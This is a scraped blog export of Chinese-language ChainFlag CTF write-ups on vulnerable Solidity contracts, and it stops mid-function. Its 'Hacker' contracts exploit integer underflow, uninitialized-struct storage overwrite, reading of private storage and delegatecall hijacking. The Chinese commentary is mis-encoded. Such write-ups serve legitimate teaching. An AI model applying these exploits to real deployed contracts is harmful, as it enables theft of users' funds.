Variable_s = 693784268739743906201; &#125; function Set(uint tmp_a, uint tmp_b, uint tmp_m) public &#123; Variable_a = tmp_a; Variable_b = tmp_b; Variable_m = tmp_m; &#125; function Output() private returns(uint) &#123; Variable_s = (Variable_s * Variable_a + Variable_b) % Variable_m; return Variable_s; &#125; function GetFlag() public payable &#123; require(Output() == 2344158256393068019755829); require(Output() == 3260253069509692480800725); require(Output() == 2504603638892536865405480); require(Output() == 1887687973911110649647086); Func memory func; func.f = payforflag; uint offset = (Variable_a - Variable_b - Variable_m) &amp; 0xffff; assembly &#123; mstore(func, sub(add(mload(func), callvalue), offset)) &#125; func.f(); &#125; function payforflag() public &#123; require(keccak256(abi.encode(msg.sender))==0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff); emit ForFlag(msg.sender); &#125;&#125; 2. analysis 3. solveEthEnc1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130pragma solidity ^0.6.12;contract EthEnc &#123; address private owner; //0 uint private key; //1 uint private delta; //2 uint public output; //3 uint32 private sum; uint224 private tmp_sum=0; //4 uint32 private key0; uint224 private t0=0; //5 uint32 private key1; uint224 private t1=0; //6 uint32 private key2; uint224 private t2=0; //7 uint32 private key3; uint224 private t3=0; //8 uint randomNumber = 0; string private s; event OhSendFlag(address addr); constructor() public payable &#123; // key = 0x74686974 5f69735e 5f746573 746b6579 key = 0x746869745f69735e5f746573746b6579; delta = 0xb3c6ef3720; &#125; modifier auth &#123; require(msg.sender == owner || msg.sender == address(this), &quot;EthEnc: not authorized&quot;); _; &#125; function payforflag() public auth &#123; require(output == 2282910687825444608285583946662268071674116917685196567156); emit OhSendFlag(msg.sender); selfdestruct(msg.sender); &#125; function Convert(string memory source) internal pure returns (uint result) &#123; bytes32 tmp; assembly &#123; tmp := mload(add(source, 32)) &#125; result = uint(tmp) / 0x10000000000000000; &#125; // æ­£ 0x 5f5f6f68 5f66616e 74616e73 69746963 5f626162 795f5f5f __oh_fantansitic_baby___ function set_s(string memory _s) public &#123; s = _s; &#125; function Encrypt() public &#123; uint tmp = Convert(s); assembly &#123; let first,second sstore(5, and(shr(96, sload(1)), 0xffffffff)) sstore(6, and(shr(64, sload(1)), 0xffffffff)) sstore(7, and(shr(32, sload(1)), 0xffffffff)) sstore(8, and(sload(1), 0xffffffff)) let step := 1 for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123; first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff) second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff) sstore(4, 0) for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123; let tmp11,tmp12 let tmp21,tmp22 tmp11 := and(add(xor(and(mul(second, 16), 0xffffffff), and(div(second, 32), 0xffffffff)), second), 0xffffffff) switch and(and(sload(4),0xffffffff), 3) case 0 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; first := and(add(first, xor(tmp11, tmp12)), 0xffffffff) sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff)) tmp21 := and(add(xor(and(mul(first, 16), 0xffffffff), and(div(first, 32), 0xffffffff)), first), 0xffffffff) switch and(and(shr(11, and(sload(4),0xffffffff)), 0xffffffff), 3) case 0 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; second := and(add(second, xor(tmp21, tmp22)), 0xffffffff) &#125; sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second)))) step := add(step, 2) &#125; &#125; &#125; receive() external payable &#123; if(msg.value == 0) &#123; this.payforflag(); &#125; else &#123; this.Encrypt(); &#125; &#125;&#125; 2. analysis 3. solve","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"check-in(1)âŒ","slug":"CTFS/ChainFlag/check-in/check-in(1)","date":"2023-08-23T07:50:10.000Z","updated":"2023-08-23T07:50:10.000Z","comments":true,"path":"2023/08/23/CTFS/ChainFlag/check-in/check-in(1)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/23/CTFS/ChainFlag/check-in/check-in(1)/","excerpt":"","text":"Greeter(1)1.questionæºç  1234567891011121314151617181920212223pragma solidity 0.8.7;contract Greeter &#123; string greeting; constructor(string memory _greeting) public &#123; greeting = _greeting; &#125; function greet() public view returns (string memory) &#123; return greeting; &#125; function setGreeting(string memory _greeting) public &#123; greeting = _greeting; &#125; function isSolved() public view returns (bool) &#123; string memory expected = &quot;HelloChainFlag&quot;; return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting)); &#125;&#125; ğŸ“Œ æˆåŠŸiè°ƒç”¨isSolved() 2. analysis emmmï¼Œè¿™é¢˜æˆ‘æ‰¾ä¸åˆ°æºç ï¼Œåœ¨æˆ‘åŒå­¦çš„åšå®¢æ‰¾åˆ°çš„ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314contract Hacker &#123; Greeter greeter; constructor(address _greeter) &#123; greeter = Greeter(_greeter); &#125; function attack() public &#123; string memory _greeting = &quot;HelloChainFlag&quot;; greeter.setGreeting(_greeting); require(greeter.isSolved(), &quot;you don&#x27;t solve&quot;); &#125;&#125; æ’æ›²å¥½å˜›ï¼Œæˆ‘å°±è¯´å˜›ï¼ŒåŸæ¥æ˜¯æˆ‘åŒå­¦é¢˜ç›®é”™äº†ã€‚ã€‚ã€‚ã€‚ Greeter(2)1. questionæºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Greeter &#123; uint256 public x; uint256 public y; bytes32 public root; mapping(bytes32 =&gt; bool) public used_leafs; constructor(bytes32 root_hash) &#123; root = root_hash; &#125; modifier onlyGreeter() &#123; require(msg.sender == address(this)); _; &#125; function g(bool a) internal returns (uint256, uint256) &#123; if (a) return (0, 1); assembly &#123; return(0, 0) &#125; &#125; function a(uint256 i, uint256 n) public onlyGreeter &#123; x = n; g((n &lt;= 2)); x = i; &#125; function b( bytes32[] calldata leafs, bytes32[][] calldata proofs, uint256[] calldata indexs ) public &#123; require(leafs.length == proofs.length, &quot;Greeter: length not equal&quot;); require(leafs.length == indexs.length, &quot;Greeter: length not equal&quot;); for (uint256 i = 0; i &lt; leafs.length; i++) &#123; require( verify(proofs[i], leafs[i], indexs[i]), &quot;Greeter: proof invalid&quot; ); require(used_leafs[leafs[i]] == false, &quot;Greeter: leaf has be used&quot;); used_leafs[leafs[i]] = true; this.a(i, y); y++; &#125; &#125; function verify( bytes32[] memory proof, bytes32 leaf, uint256 index ) internal view returns (bool) &#123; bytes32 hash = leaf; for (uint256 i = 0; i &lt; proof.length; i++) &#123; bytes32 proofElement = proof[i]; if (index % 2 == 0) &#123; hash = keccak256(abi.encodePacked(hash, proofElement)); &#125; else &#123; hash = keccak256(abi.encodePacked(proofElement, hash)); &#125; index = index / 2; &#125; return hash == root; &#125; function isSolved() public view returns (bool) &#123; return x == 2 &amp;&amp; y == 4; &#125;&#125; ğŸ“Œ æˆåŠŸiè°ƒç”¨isSolved() 2. analysis 3. solve","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"integer_overflow(2)","slug":"CTFS/ChainFlag/integer overflow/integer_overflow(2)","date":"2023-08-23T04:50:10.000Z","updated":"2023-08-23T04:50:10.000Z","comments":true,"path":"2023/08/23/CTFS/ChainFlag/integer overflow/integer_overflow(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/23/CTFS/ChainFlag/integer%20overflow/integer_overflow(2)/","excerpt":"","text":"bet1. questionæºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667pragma solidity ^0.4.24;contract bet &#123; uint secret; address owner; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; mapping(address =&gt; uint) public isbet; event SendFlag(string b64email); function Bet() public&#123; owner = msg.sender; &#125; function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); balanceOf[msg.sender]=0; owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; //to fuck modifier only_owner() &#123; require(msg.sender == owner); _; &#125; function setsecret(uint secretrcv) only_owner &#123; secret=secretrcv; &#125; function deposit() payable&#123; uint geteth=msg.value/1000000000000000000; balanceOf[msg.sender]+=geteth; &#125; function profit() &#123; require(gift[msg.sender]==0); gift[msg.sender]=1; balanceOf[msg.sender]+=1; &#125; function betgame(uint secretguess)&#123; require(balanceOf[msg.sender]&gt;0); balanceOf[msg.sender]-=1; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; isbet[msg.sender]=1; &#125; &#125; function doublebetgame(uint secretguess) only_owner&#123; require(balanceOf[msg.sender]-2&gt;0); require(isbet[msg.sender]==1); balanceOf[msg.sender]-=2; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; &#125; &#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2. analysis è¦æ±‚æ˜¯require(balanceOf[msg.sender] &gt;= 100000);è°ƒç”¨è€…çš„balanceå¤§äº100000ï¼Œå¾ˆæ˜¾ç„¶è¿™é‡Œéœ€è¦æº¢å‡ºã€‚ç›´æ¥çœ‹åˆ°ä¸¤ä¸ªbetç›¸å…³çš„å‡½æ•° 12345678910111213141516171819function betgame(uint secretguess)&#123; require(balanceOf[msg.sender]&gt;0); balanceOf[msg.sender]-=1; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; isbet[msg.sender]=1; &#125;&#125;function doublebetgame(uint secretguess) only_owner&#123; require(balanceOf[msg.sender]-2&gt;0); require(isbet[msg.sender]==1); balanceOf[msg.sender]-=2; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; &#125;&#125; ä¸éš¾çœ‹å‡ºdoublebetgame()ä¸­çš„require(balanceOf[msg.sender]-2&gt;0)æ˜æ˜¾æœ‰ç€ä¸‹æº¢çš„å¯èƒ½ï¼Œä¸”balanceOf[msg.sender]-=2;å…·å¤‡äº†ä¸‹æº¢çš„æ¡ä»¶ã€‚æ‰€ä»¥æˆåŠŸï¼Œä½†æ˜¯ä¸èƒ½è¿›å…¥ifè¯­å¥ï¼Œå› ä¸ºä¸€æ—¦è¿›å…¥ifbalanceä¼šè¢«æ¢å¤ï¼Œé‚£å°†æ˜¯å‰åŠŸå°½å¼ƒã€‚è‡³äºbetgame()åˆ™æ˜¯å¯ä»¥å¸®å¿™å®ç°isbet[msg.sender]==1ï¼ŒåŒæ—¶æ»¡è¶³ -2å‘ç”Ÿæº¢å‡ºçš„æ¡ä»¶ï¼Œå³æ‰å¯¹ä¸€æ¬¡å†æ•…æ„è¾“æ‰ä¸€æ¬¡ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920contract Hacker &#123; bet bet_; constructor(address _bet) public &#123; bet_ = bet(_bet); &#125; function attack() public &#123; bet_.Bet(); // æˆä¸ºowner bet_.setsecret(9999); // è®¾ç½®å¯†ç  bet_.profit(); // è·å–ç©ºæŠ• bet_.betgame(9999); // å°†isbet[msg.sender]å˜ä¸º1 bet_.betgame(6666); // æ•…æ„è¾“é’± bet_.doublebetgame(6666); // å‘ç”Ÿä¸‹æº¢ bet_.payforflag(&quot;hacker&quot;); &#125; function() external payable&#123;&#125;&#125; hf1. questionæºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970pragma solidity ^0.4.24;contract hf &#123; address secret; uint count; address owner; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; struct node &#123; address nodeadress; uint nodenumber; &#125; node public node0; event SendFlag(string b64email); constructor()public&#123; owner = msg.sender; &#125; function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); balanceOf[msg.sender]=0; owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; //to fuck modifier onlySecret() &#123; require(msg.sender == secret); _; &#125; function profit() public&#123; require(gift[msg.sender]==0); gift[msg.sender]=1; balanceOf[msg.sender]+=1; &#125; function hfvote() public payable&#123; uint geteth=msg.value/1000000000000000000; balanceOf[msg.sender]+=geteth; &#125; function ubw() public payable&#123; if (msg.value &lt; 2 ether) &#123; node storage n = node0; n.nodeadress=msg.sender; n.nodenumber=1; &#125; else &#123; n.nodeadress=msg.sender; n.nodenumber=2; &#125; &#125; function fate(address to,uint value) public onlySecret &#123; require(balanceOf[msg.sender]-value&gt;=0); balanceOf[msg.sender]-=value; balanceOf[to]+=value; &#125; &#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2. analysis è¦æ±‚require(balanceOf[msg.sender] &gt;= 100000);æœ‰æº¢å‡ºæ¼æ´çš„å‡½æ•°åªæœ‰fateï¼Œåˆ†æfate 12345function fate(address to,uint value) public onlySecret &#123; require(balanceOf[msg.sender]-value&gt;=0); balanceOf[msg.sender]-=value; balanceOf[to]+=value;&#125; å¾ˆæ˜æ˜¾çš„ä¸‹æº¢æ¼æ´balanceOf[msg.sender]-=valueï¼Œä½†è¦æˆä¸ºsecretï¼Œçœ‹åˆ°ubwå‡½æ•° 12345678910111213function ubw() public payable&#123; if (msg.value &lt; 2 ether) &#123; node storage n = node0; n.nodeadress=msg.sender; n.nodenumber=1; &#125; else &#123; n.nodeadress=msg.sender; n.nodenumber=2; &#125;&#125; åªè¦é€šè¿‡esleä¸­è¿›å»ï¼Œå°±å¯ä»¥è¦†ç›–æ‰åŸæ¥çš„secretå˜é‡ï¼Œè¿™æ ·å°±æˆä¸ºsecretäº†ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516contract Hacker &#123; hf _hf; constructor(address hf_) public &#123; _hf = hf(hf_); &#125; function attack() public payable &#123; _hf.ubw.value(2 ether)(); // è¦†ç›– secretï¼Œå¹¶æˆä¸ºsecret _hf.fate(msg.sender, 1); // å‘ç”Ÿä¸‹æº¢ _hf.payforflag(&quot;hacker&quot;); &#125; function() external payable&#123;&#125;&#125; æ€»ç»“ç®€å•çš„æº¢å‡ºå’Œä½ç‰ˆæœ¬åˆçº¦ä¸­çš„ç»“æ„ä½“å†…å­˜è¦†ç›–ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"delegatecall(2)","slug":"CTFS/ChainFlag/delegatecall/delegatecall(2)","date":"2023-08-22T04:50:10.000Z","updated":"2023-08-22T04:50:10.000Z","comments":true,"path":"2023/08/22/CTFS/ChainFlag/delegatecall/delegatecall(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/22/CTFS/ChainFlag/delegatecall/delegatecall(2)/","excerpt":"","text":"CounterStrike1.questionæºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768pragma solidity ^0.5.10;contract Launcher&#123; uint256 public deadline; function setdeadline(uint256 _deadline) public &#123; deadline = _deadline; &#125; constructor() public &#123; deadline = block.number + 100; &#125;&#125;contract Setup &#123; EasyBomb public easyBomb; constructor(bytes32 _password) public &#123; easyBomb = new EasyBomb(address(new Launcher()), _password); &#125; function isSolved() public view returns (bool) &#123; return easyBomb.power_state() == false; &#125;&#125;contract EasyBomb&#123; bool private hasExplode = false; address private launcher_address; bytes32 private password; bool public power_state = true; bytes4 constant launcher_start_function_hash = bytes4(keccak256(&quot;setdeadline(uint256)&quot;)); Launcher launcher; function msgPassword() public returns (bytes32 result) &#123; bytes memory msg_data = msg.data; if (msg_data.length == 0) &#123; return 0x0; &#125; assembly &#123; result := mload(add(msg_data, add(0x20, 0x24))) &#125; &#125; modifier isOwner()&#123; require(msgPassword() == password); require(msg.sender != tx.origin); uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier notExplodeYet()&#123; launcher = Launcher(launcher_address); require(block.number &lt; launcher.deadline()); hasExplode = true; _; &#125; constructor(address _launcher_address, bytes32 _fake_flag) public &#123; launcher_address = _launcher_address; password = _fake_flag ; &#125; function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123; launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline)); &#125;&#125; ğŸ“Œ ç›®æ ‡ï¼šæˆåŠŸè°ƒç”¨Setupåˆçº¦ä¸­çš„isSolved()å‡½æ•°ã€‚ 2.analysis è°ƒç”¨isSolved()çš„å‰ææ˜¯ï¼šå°†EasyBombåˆçº¦çš„power_stateå˜é‡ä¿®æ”¹ä¸ºfalseï¼Œè€Œèƒ½å®Œæˆè¿™ä¸ªè¦æ±‚çš„åªæœ‰setCountDownTimerå‡½æ•°ï¼Œdelegatecallå˜›ï¼Œè°ƒç”¨é€»è¾‘åˆçº¦çš„ä»£ç é€»è¾‘ï¼Œå…¶ä½œç”¨ä½œç”¨åœ¨è‡ªå·±èº«ä¸Šã€‚è¿™ä¸ºä¿®æ”¹power_stateæä¾›äº†å¯èƒ½æ€§ã€‚ è€Œï¼Œè°ƒç”¨è¯¥å‡½æ•°çš„å‰ææ˜¯ï¼Œé€šè¿‡ä¸¤é“ä¿®é¥°å™¨ï¼Œå…ˆæ¥åˆ†æä¸¤ä¸ªä¿®é¥°å™¨ isOwner()ï¼š 12345678modifier isOwner()&#123; require(msgPassword() == password); require(msg.sender != tx.origin); uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _;&#125; ä¸‰ä¸ªæ–­è¨€ï¼š è¦çŒœå¯¹å¯†ç ï¼Œå¯†ç çš„å­˜å‚¨å½¢å¼ä¸ºï¼šbytes32 private password;ï¼Œåœ¨åŒºå—é“¾ä¸­åˆçº¦ä¸Šçš„ä¿¡æ¯éƒ½æ˜¯å…¬å¼€é€æ˜çš„ï¼Œå³ä½¿ä½¿ç”¨äº†privateä¿®é¥°ç¬¦ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥é€šè¿‡è„šæœ¬è¯­è¨€æ¥è·å–ï¼Œæ¯”å¦‚ethersjs: 1234567891011121314151617181920212223242526const &#123; ethers &#125; = require(&#x27;hardhat&#x27;);describe(&quot;[chainflag]CounterStrike&quot;, function() &#123; let deployer, player; // æ‰§è¡Œæ“ä½œçš„å‰åºå·¥ä½œ before(async function() &#123; [deployer, player] = await ethers.getSigners(); &#125;); // æ”»å‡»é€»è¾‘ it(&quot;Execution&quot;, async function() &#123; let contractAddress = &quot;&quot;; // EasyBomb&#x27;address let slot = await ethers.provider.getStorage(contractAddress, 1); console.log(`slot = $&#123;slot&#125;`); &#125;); // éªŒè¯æ˜¯å¦é€šè¿‡ after(async function() &#123; &#125;);&#125;); ä¸ºä½•æ˜¯è·å–slot1ä½ç½®çš„å€¼å‘¢ï¼Œå› ä¸ºbool private hasExplode = false; address private launcher_address;è¿™ä¸¤ä¸ªå˜é‡çš„å­˜å‚¨ç©ºé—´åŠ èµ·æ¥ä¸ä¸åˆ°32bytesï¼ŒEVMæˆ–è¿›è¡Œå†…å­˜ä¼˜åŒ–ï¼Œå°†è¿™ä¸¤ä¸ªå€¼ä¸€åŒå­˜æ”¾åœ¨slot0çš„ä½ç½®ã€‚ è¦æ±‚è°ƒç”¨è€…ä¸èƒ½æ˜¯EOAï¼Œåªéœ€è¦é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦è°ƒç”¨å³å¯ è¦æ±‚è°ƒç”¨è€…ä¸­çš„ä»£ç é‡ä¸º0ï¼Œç®€å•ï¼Œåœ¨æ„é€ å‡½æ•°constructorä¸­è°ƒç”¨å‡½æ•°å³å¯ã€‚ notExplodeYet()ï¼š 123456modifier notExplodeYet()&#123; launcher = Launcher(launcher_address); require(block.number &lt; launcher.deadline()); hasExplode = true; _;&#125; è¦æ±‚åœ¨ä¸€ç™¾ä¸ªåŒºå—çš„æ—¶é—´å†…æ‰å¯ä»¥è°ƒç”¨ åˆ†æsetCountDownTimer(uint256) 123function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123; launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline));&#125; emmmï¼Œä»”ç»†åˆ†æè¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œå› ä¸ºåœ¨launcher_addressï¼Œå…¶åŠŸèƒ½åªæ˜¯ä¿®æ”¹Launcheråˆçº¦ä¸­çš„deadlineï¼Œæ»¡æ‰“æ»¡ç®—ä¹Ÿåªèƒ½å°†EasyBombåˆçº¦ä¸­çš„slot0ä½ç½®çš„ä¸¤ä¸ªå˜é‡è¦†ç›–ï¼Œä¸èƒ½ä¿®æ”¹åˆ°power_stateçš„å€¼ï¼Œç´¢æ€§ä¿®æ”¹launcher_addressä¸ºæ”»å‡»åˆçº¦çš„åœ°å€å§ï¼Œè¿™æ ·setdeadline(uint256)å¯ä»¥æ‰§è¡Œæ”»å‡»é€»è¾‘ã€‚ ä½†æ˜¯æƒ³è±¡æ˜¯ç¾å¥½çš„ï¼Œä¸­è§„ä¸­çŸ©çš„è¦†ç›–ä¼šå‡ºç°åå·®ï¼Œåªå¡«å…¥åœ°å€å€¼çš„è¯ï¼Œå®é™…å­˜å‚¨åˆ°åˆçº¦ä¸Šlauncher_addressçš„å€¼ä¼šä½8ä½ï¼Œå¦‚ï¼š æ‰€ä»¥éœ€è¦å¯¹åœ°å€è¿›è¡Œå·¦ç§»8ä½ï¼š&lt;&lt;8ã€‚ å†çœ‹çœ‹msgPassword()å‡½æ•°ä¸­çš„å¦‚ä¸‹ä»£ç  12345bytes memory msg_data = msg.data;assembly &#123; result := mload(add(msg_data, add(0x20, 0x24)))&#125; bytes memory msg_data = msg.data;ä¸­msg_data æ˜¯åŠ¨æ€æ•°ç»„ç±»å‹ï¼Œä¸”åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç”±äºåŠ¨æ€æ•°ç»„æ¯”è¾ƒç‰¹æ®Šï¼Œå¾€å¾€åœ¨msg_dataçœŸæ­£çš„æ•°æ®å€¼å‰å…ˆå ç”¨32bytesæ¥ä¿å­˜æ•°ç»„çš„é•¿åº¦ï¼Œç”»ä¸ªå›¾ï¼š è€Œåœ¨å†…è”æ±‡ç¼–ä¸­ç›´æ¥å†™å…¥å˜é‡åçš„ä½œç”¨æ˜¯ï¼Œç›´æ¥åˆ°å­˜å‚¨è¯¥å˜é‡çš„ä½ç½®ã€‚ result := mload(add(msg_data, add(0x20, 0x24)))ï¼šè¡¨ç¤ºï¼Œå…ˆåˆ°å­˜å‚¨msg_data çš„ä½ç½®ï¼Œç„¶åï¼Œè·³è¿‡0x44ä¸ªå­—èŠ‚ï¼Œä¸ºä»€ä¹ˆæ˜¯ 68byteså‘¢ï¼Œå› ä¸ºå‰ 32bytes å­˜å‚¨æ•°ç»„é•¿åº¦ï¼Œ3235byteså­˜å‚¨å‡½æ•°çš„æ„é€ å™¨ï¼Œ3667byteså­˜å‚¨çš„æ˜¯è¯¥å‡½æ•°é€‰æ‹©å™¨çš„å½¢å‚ï¼Œè·³è¿‡è¿™äº›ä¹‹åï¼Œå†è¯»å–32bytesçš„æ•°æ®ï¼Œæ‰€æ–™ä¸é”™çš„è¯åº”è¯¥å°±æ˜¯è‡ªå·±åŒ…è£…çš„passwordã€‚è›®ç»†èŠ‚çš„ã€‚ 3. solveæ”»å‡»åˆçº¦ï¼š 1234567891011121314151617181920212223242526272829303132333435363738contract Helper &#123; bool private hasExplode = false; address private launcher_address; bytes32 private password; bool public power_state = true; uint256 public deadline; constructor(address _setup) public &#123; deadline = block.number + 100; &#125; function setdeadline(uint256) public &#123; power_state = false; &#125;&#125;contract Hacker &#123; Helper helper; Setup setup; EasyBomb bomb; bytes32 password; constructor(address _setup, bytes32 _password) public &#123; helper = new Helper(_setup); setup = Setup(_setup); password = _password; bomb = setup.easyBomb(); attack(); &#125; function attack() internal &#123; uint hacker_address = uint(uint160(address(helper))) &lt;&lt; 8; // å·¦ç§»8ä½ address(bomb).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;, hacker_address, password)); address(bomb).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;, hacker_address, password)); &#125;&#125; SafeDelegatecall1.questionæºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162pragma solidity ^0.4.23;contract SafeDelegatecall &#123; address private owner; bytes4 internal constant SET = bytes4(keccak256(&#x27;fifth(uint256)&#x27;)); event SendFlag(address addr); uint randomNumber = 0; struct Func &#123; function() internal f; &#125; constructor() public payable &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function execute(address _target) public payable&#123; require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;); bytes4 sel; uint val; (sel, val) = getRet(); require(sel == SET); Func memory func; func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) &#125; func.f(); &#125; function gift() private &#123; payforflag(); &#125; function getRet() internal pure returns (bytes4 sel, uint val) &#123; assembly &#123; if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125; let ptr := mload(0x40) returndatacopy(ptr, 0, 0x24) sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) val := mload(add(0x04, ptr)) &#125; &#125; function payforflag() public payable onlyOwner &#123; require(msg.value == 1, &#x27;I only need a little money!&#x27;); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function() payable public&#123;&#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag()ï¼Œä¹ŸæŒ‡æˆåŠŸæ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°å¯¹å§ã€‚ 2.analysis é¢˜ç›®è¦æ±‚æ˜¯æˆåŠŸè°ƒç”¨payforflag()å‡½æ•°ï¼Œçœ‹ä¸€éä»£ç æ²¡å‘ç°å¯ä»¥æˆä¸ºownerçš„æ¼æ´ï¼Œè®©æˆ‘è¿™èœé¸Ÿä¸€åº¦é™·å…¥è¿·èŒ«ï¼Œçœ‹äº†å¤§ä½¬çš„åšå®¢ä¹‹åèŒ…å¡é¡¿å¼€ã€‚æˆåŠŸè°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œæ— éå°±æ˜¯å°†å…¶å‡½æ•°ä½“ä¸­çš„ä»£ç é€»è¾‘è·‘é€šï¼Œè‡³äºé‚£äº›é™åˆ¶æ¡ä»¶ï¼Œæ— éå°±æ˜¯é˜»æ­¢ä½ æˆåŠŸè¿è¡Œå‡½æ•°ä½“çš„ä»£ç è€Œå·²ï¼Œè¦æ˜¯èƒ½ç›´æ¥è·³è¿‡é™åˆ¶æ¡ä»¶ï¼Œé—®é¢˜å°±è¿åˆƒè€Œè§£äº†ã€‚ è§£é¢˜çš„å…³é”®åœ¨äºexecute() å’Œ getRet()å‡½æ•° 1234567891011121314151617181920212223242526 function execute(address _target) public payable&#123; require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;); bytes4 sel; uint val; (sel, val) = getRet(); require(sel == SET); Func memory func; // è¿™é‡Œå£°æ˜ä¸ºmemoryä¸ä¼šå‡ºç°æ’æ§½è¦†ç›– func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) // å­˜æ”¾åœ¨memoryä¸­ &#125; func.f(); &#125; function getRet() internal pure returns (bytes4 sel, uint val) &#123; assembly &#123; if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125; // eq ç›¸ç­‰è¿”å› 1ï¼Œä¸ç›¸ç­‰è¿”å›0ï¼Œè¦æ±‚è¿”å›å€¼å¾—æ˜¯ 36bytes let ptr 